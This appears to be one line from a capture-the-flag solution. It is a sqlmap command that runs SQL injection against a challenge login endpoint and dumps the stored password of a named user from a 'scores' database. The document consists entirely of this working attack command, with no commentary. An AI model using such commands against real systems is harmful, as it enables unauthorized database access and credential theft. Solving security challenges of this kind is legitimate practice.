sqlmap -u https://bouncy-box.chals.damctf.xyz/login --data '{"username":"BobbySincluston","password":"asdasdasd","score":0}' --dump -D scores -T users -C password --where="username='boxy_mcbounce'"
